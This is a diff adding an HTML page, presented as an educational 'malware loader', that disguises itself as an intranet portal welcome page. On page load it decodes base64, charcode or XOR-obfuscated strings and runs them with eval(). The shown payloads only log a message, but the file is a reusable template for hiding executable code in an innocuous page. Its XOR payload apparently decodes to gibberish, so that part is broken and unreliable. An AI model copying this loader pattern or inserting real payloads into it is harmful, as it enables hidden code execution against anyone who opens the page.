@@ -1,0 +1,52 @@
+<!--
+  Educational Malware Loader - vaporhook_loader.html
+  Accepts multiple payload formats:
+    - Base64-encoded
+    - CharCode-based
+    - XOR-encrypted with embedded key
+  Simulates real-world modular malware loaders
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome</title>
+  <script>
+  const PAYLOAD_FORMAT = "xor"; // Change to "base64" or "charcode"
+
+const payload_base64 = "Y29uc29sZS5sb2coIk1hbHdhcmUgcmVhY2hlZCB5b3VyIHN5c3RlbS4iKTs=";
+
+const payload_charcode = String.fromCharCode(
+  99,111,110,115,111,108,101,46,108,111,103,40,34,
+  77,97,108,119,97,114,101,32,114,101,97,99,104,101,
+  100,32,121,111,117,114,32,115,121,115,116,101,109,
+  46,34,41,59
+);
+
+const xor_payload = [
+  42, 38, 35, 58, 34, 37, 44, 103, 37, 38, 34, 97, 106, 37,
+  38, 46, 38, 35, 43, 37, 40, 45, 40, 37, 35, 34, 45, 37,
+  37, 44, 40, 59, 34, 61, 40, 34, 42, 34, 41, 37, 103
+];
+const xor_key = 73;
+
+function runPayload() {
+  if (PAYLOAD_FORMAT === "base64") eval(atob(payload_base64));
+  if (PAYLOAD_FORMAT === "charcode") eval(payload_charcode);
+  if (PAYLOAD_FORMAT === "xor") {
+    let decoded = "";
+    for (let i = 0; i < xor_payload.length; i++) {
+      decoded += String.fromCharCode(xor_payload[i] ^ xor_key);
+    }
+    eval(decoded);
+  }
+}
+
+runPayload(); // Simulate trigger
+
+  </script>
+</head>
+<body>
+  <h1>Welcome to Our Intranet Portal</h1> <!-- Camouflage -->
+</body>
+</html>
